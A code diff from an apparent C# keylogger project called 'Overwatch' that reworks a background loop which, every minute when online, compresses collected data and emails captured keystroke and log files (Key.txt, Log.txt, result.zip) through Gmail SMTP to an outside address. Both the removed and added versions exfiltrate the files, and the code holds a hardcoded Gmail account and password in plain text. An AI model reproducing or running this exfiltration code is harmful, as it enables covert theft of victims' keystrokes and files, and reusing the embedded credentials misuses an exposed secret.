@@ -14,33 +14,35 @@ namespace Overwatch
             {
                 while (true)
                 {
+                    cThread.sending = true;
                     System.Threading.Thread.Sleep(60000);
                     if (ConnectivityChecker.CheckInternet() == true)
                     {
-                        
-                        //cKeylogger.send = true;
-                        MailAddress from = new MailAddress("isthechastener@gmail.com");
-                        MailAddress to = new MailAddress("satiriorn@gmail.com");
-                        MailMessage message = new MailMessage(from, to);
-                        cReceiveInformation.CompressionFile();
-                        message.Subject = "Information";
-                        message.Body = "<h2>" + cReceiveInformation.UsersName + "</h2>";
-                        cMain.Abort();
-                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
-                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
-                        message.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));
-                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\GeneralApplication.txt"));
-                        message.IsBodyHtml = true;
-                        SmtpClient smtp = new SmtpClient("smtp.gmail.com", 25);
-                        smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
-                        smtp.EnableSsl = true;
-                        smtp.Send(message);
-                        message.Dispose();
-                        cMain.Start();
+                        using (MailMessage mail = new MailMessage())
+                        {
+                            mail.From = new MailAddress("isthechastener@gmail.com");
+                            mail.To.Add("satiriorn@gmail.com");
+                            mail.Subject = "Hello World";
+                            mail.Body = "<h1>Hello</h1>";
+                            mail.IsBodyHtml = true;
+                            cReceiveInformation.CompressionFile();
+                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
+                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
+                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));
+
+                            using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
+                            {
+                                smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
+                                smtp.EnableSsl = true;
+                                smtp.Send(mail);
+                            }
+                        }
+                        cThread.sending = false;
+                        cMain.Thread();
                     }
                 }
             }
-            catch (Exception ex) { Log.Write(ex.Message, true); }
+            catch (Exception ex) { Log.Write(ex.Message, true); cThread.sending = false; }
         }
     }
     public static class ConnectivityChecker
